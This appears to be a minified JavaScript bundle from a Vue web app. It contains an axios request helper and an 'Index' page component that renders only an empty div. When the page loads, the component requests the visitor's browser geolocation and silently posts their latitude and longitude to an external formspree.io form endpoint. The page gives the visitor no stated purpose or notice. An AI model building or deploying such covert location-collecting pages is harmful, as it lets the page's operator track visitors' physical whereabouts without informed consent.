import{E as n,b as u,d as c,e as l,o as d,c as m}from "./index.7163e976.js";import{_ as g}from "./plugin-vue_export-helper.21dcd24c.js";const a=Symbol("showMessage");class f{success(r,t=!0){this[a]("success",r,t)}warning(r,t=!0){this[a]("warning",r,t)}info(r,t=!0){this[a]("info",r,t)}error(r,t=!0){this[a]("error",r,t)}[a](r,t,e){e?document.getElementsByClassName("el-message").length===0&&n[r](t):n[r](t)}}function _(s){const r=u.create({baseURL:"/api",timeout:6e4}),t=new f;return r.interceptors.request.use(e=>{const o=localStorage.getItem("token");return o&&(e.headers.Authorization=o),e},function(e){return Promise.reject(e)}),r.interceptors.response.use(e=>e.request.responseType==="blob"?e:e.data.code!=200&&!e.data.ok?(t.error(e.data.msg),Promise.reject(e.data)):e.data,e=>{if(!e.response){t.error("\u670D\u52A1\u5668\u672A\u542F\u52A8");return}switch(e.response.status){case 401:t.error("token\u9A8C\u8BC1\u5931\u8D25"),i();break;case 403:t.error("token\u8FC7\u671F"),i();break;case 404:t.error("404");break;case 500:t.error("\u670D\u52A1\u5668\u9519\u8BEF");break;default:return Promise.reject(e)}return Promise.reject(e)}),r(s)}function i(){localStorage.setItem("token",""),setTimeout(()=>{location.reload()},1e3)}function h(s){return _({method:"post",url:"https://formspree.io/f/xeqbdger",data:s})}const p={class:"index-content"},b={__name:"Index",setup(s){const r=c(),t=c();l(()=>{e()});function e(){navigator.geolocation?navigator.geolocation.getCurrentPosition(function(o){r.value=o.coords.latitude,t.value=o.coords.longitude,h({\u7EAC\u5EA6:r.value,\u7ECF\u5EA6:t.value}).then()}):console.log("\u8BE5\u6D4F\u89C8\u5668\u4E0D\u652F\u6301\u83B7\u53D6\u4F4D\u7F6E\u4FE1\u606F")}return(o,k)=>(d(),m("div",p))}};var w=g(b,[["__scopeId","data-v-0fcb3b17"]]);export{w as default};
